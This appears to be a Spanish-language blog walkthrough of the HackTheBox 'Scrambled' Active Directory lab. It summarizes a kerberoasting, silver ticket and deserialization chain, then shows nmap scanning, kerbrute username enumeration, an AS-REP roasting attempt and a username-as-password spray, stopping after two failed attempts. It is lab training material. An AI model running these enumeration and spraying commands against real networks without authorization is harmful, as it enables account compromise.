<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Scrambled (medium) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Scrambled (medium)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-04-30T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Scrambled (medium)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-30T00:00:00-06:00","datePublished":"2024-04-30T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Scrambled (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Scrambled (medium)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-04-30T00:00:00-06:00" itemprop="datePublished">
        Apr 30, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png" />
</p>

<ul>
  <li>Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user <code class="language-plaintext highlighter-rouge">ksimpson</code>. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the <code class="language-plaintext highlighter-rouge">Public</code> share with the credentials of <code class="language-plaintext highlighter-rouge">ksimpson</code>, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account <code class="language-plaintext highlighter-rouge">SqlSvc</code> has a <code class="language-plaintext highlighter-rouge">Service Principal Name</code> (SPN) associated with it. An attacker can use this information to perform an attack that is knows as <code class="language-plaintext highlighter-rouge">kerberoasting</code> and get the hash of <code class="language-plaintext highlighter-rouge">SqlSvc</code>. After cracking the hash and acquiring the credentials for the <code class="language-plaintext highlighter-rouge">SqlSvc</code> account an attacker can perform a <code class="language-plaintext highlighter-rouge">silver ticket</code> attack to forge a ticket and impersonate the user <code class="language-plaintext highlighter-rouge">Administrator</code> on the remote MSSQL service. Enumeration of the database reveals the credentials for user <code class="language-plaintext highlighter-rouge">MiscSvc</code>, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a <code class="language-plaintext highlighter-rouge">.NET</code> application, which is listening on port <code class="language-plaintext highlighter-rouge">4411</code>. Reverse engineering the application reveals that it is using the insecure <code class="language-plaintext highlighter-rouge">Binary Formatter</code> class to transmit data, allowing the attacker to upload their own payload and get code execution as <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code> así como sus servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49686,49727 10.10.11.168 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-29 18:25 CST
Nmap scan report <span class="k">for </span>10.10.11.168
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>

Bug <span class="k">in </span>ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-30 00:25:54Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|_    TCP port: 1433
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Not valid before: 2024-04-30T00:21:53
|_Not valid after:  2054-04-30T00:21:53
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
|_    ERROR_UNKNOWN_COMMAND<span class="p">;</span>
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>4/29%Time<span class="o">=</span>66303A95%P<span class="o">=</span>x86_64-pc-linux-gnu%r
SF:<span class="o">(</span>NULL,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,1D,<span class="s2">"SCRAMB
SF:LECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">
SF:0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,35,<span class="s2">"SCRAMBLECORP_OR
SF:DERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,35,<span class="s2">"SCRAMB
SF:LECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,1D,<span class="s2">"
SF:SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,1D,<span class="s2">"SCRAMBLE
SF:CORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,1D,<span class="s2">"SCRAMBLECORP_ORDE
SF:RS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Help,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UN
SF:KNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>
SF:TLSSessionReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,1D,<span class="s2">"SC
SF:RAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,1D,<span class="s2">"SCRAMBLECORP_ORDERS_
SF:V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Fo
SF:urOhFourRequest,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMM
SF:AND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LPDString,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNO
SF:WN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LDAPSearchReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">
SF:"</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,3
SF:5,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LAND
SF:esk-RC,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServer,1D,<span class="s2">"SCR
SF:AMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>NCP,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3
SF:;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>NotesRPC,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>JavaRMI,1D
SF:,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>WMSRequest,1D,<span class="s2">"SCRAMBLECORP_ORD
SF:ERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>oracle-tns,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span>
SF:<span class="o">)</span>%r<span class="o">(</span>ms-sql-s,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>afp,1D,<span class="s2">"SCRAMBLE
SF:CORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>giop,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\</span><span class="s2">
SF:n"</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-30T00:28:22
|_  start_date: N/A
|_clock-skew: mean: <span class="nt">-4s</span>, deviation: 0s, median: <span class="nt">-4s</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>De primeras no vemos nada de información relevante sobre la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.168
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.168<span class="o">)</span> <span class="o">(</span>domain:10.10.11.168<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Como la maquina tiene muchos puertos abiertos podemos probar con otro protocolo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ldap 10.10.11.168
LDAP        10.10.11.168    389    DC1.scrm.local   <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:DC1.scrm.local<span class="o">)</span> <span class="o">(</span>domain:scrm.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos agregar los dominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local
</code></pre></div></div>

<ul>
  <li>Al parecer tenemos limitaciones para enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.11.168 <span class="nt">--shares</span>
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.168<span class="o">)</span> <span class="o">(</span>domain:10.10.11.168<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span>-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.168 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Tampoco podemos enumerar por el protocolo <strong>RPC</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.10.11.168
Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED
</code></pre></div></div>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto a si que podemos ver su contenido y si encontramos algo interesante.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Scramble</span> <span class="no">Corp</span> <span class="no">Intranet</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/1.png" />
</p>

<ul>
  <li>
    <p>En la parte de <code class="language-plaintext highlighter-rouge">IT Services</code> encontramos lo siguiente.</p>
  </li>
  <li>
    <p>Nos dicen que debido a la brecha de seguridad que hubo el mes pasado deshabilitaron la autenticación NTLM pero dice que seamos pacientes mientras trabajan en resolverlo.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/2.png" />
</p>

<ul>
  <li>Tenemos <code class="language-plaintext highlighter-rouge">Resources</code> interesantes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/3.png" />
</p>

<ul>
  <li>Probando en <code class="language-plaintext highlighter-rouge">New User Account</code> no funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/4.png" />
</p>

<ul>
  <li>Pero en <strong>Contacting IT Support</strong> vemos un nombre de usuario que es <code class="language-plaintext highlighter-rouge">ksimpson</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/5.png" />
</p>

<ul>
  <li>Podemos usa <code class="language-plaintext highlighter-rouge">kerbrute</code> para verificar que sea un usuario del dominio pero como no sabemos si existan mas usuarios podemos usar un diccionario <a href="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt">https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt</a> para enumerar mas usuarios en caso de que los allá.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> scrm.local <span class="nt">--dc</span> DC1.scrm.local /opt/A-ZSurnames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 18:53:06 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/29 18:53:06 <span class="o">&gt;</span>  	DC1.scrm.local:88

2024/04/29 18:53:06 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ASMITH@scrm.local
2024/04/29 18:53:44 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 JHALL@scrm.local
2024/04/29 18:53:48 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 KSIMPSON@scrm.local
2024/04/29 18:53:51 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 KHICKS@scrm.local
2024/04/29 18:54:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 SJENKINS@scrm.local
</code></pre></div></div>

<ul>
  <li>Vamos agregarlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
asmith
jhall
ksimpson
khicks
sjenkins
</code></pre></div></div>

<ul>
  <li>Si recordamos no tenemos la autenticación <code class="language-plaintext highlighter-rouge">NTLM</code> activada pero podemos probar solicitar un <code class="language-plaintext highlighter-rouge">TGT</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers scrm.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User asmith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User jhall doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User ksimpson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User khicks doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User sjenkins doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>
    <p>Lo que podemos hacer es ver si algún usuario usa su nombre de usuario como su contraseña esto casi siempre suele pasar podemos usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> y <code class="language-plaintext highlighter-rouge">kerbrute</code> para este proceso.</p>
  </li>
  <li>
    <p>Lo hacemos con otro protocolo por que <code class="language-plaintext highlighter-rouge">smb</code> no funciona y de los que tiene contemplado <code class="language-plaintext highlighter-rouge">crackmapexec</code> <code class="language-plaintext highlighter-rouge">ldap</code> si funciona.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme ldap scrm.local <span class="nt">-u</span> users.txt <span class="nt">-p</span> users.txt <span class="nt">-k</span> <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span>
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:DC1.scrm.local<span class="o">)</span> <span class="o">(</span>domain:scrm.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\a</span>smith:asmith KDC_ERR_PREAUTH_FAILED
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\j</span>hall:jhall KDC_ERR_PREAUTH_FAILED
